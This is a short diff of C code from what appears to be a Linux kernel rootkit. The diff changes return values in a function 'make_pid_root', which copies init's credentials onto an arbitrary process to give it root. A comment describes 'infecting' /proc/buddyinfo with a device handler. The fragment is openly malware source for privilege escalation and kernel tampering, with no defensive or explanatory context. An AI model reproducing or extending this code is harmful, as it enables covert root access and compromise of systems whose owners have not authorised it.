@@ -38,10 +38,10 @@ static ssize_t make_pid_root (
     struct task_struct *task = get_task_struct_by_pid(pid);
     struct task_struct *init_task = get_task_struct_by_pid(1);
     if(!task || !init_task)
-        return -1;
+        return 1;
     task->cred = init_task->cred;
 
-    return -1;
+    return 1;
 }
 /**
  * Infects /proc/buddyinfo with a device handler that sets
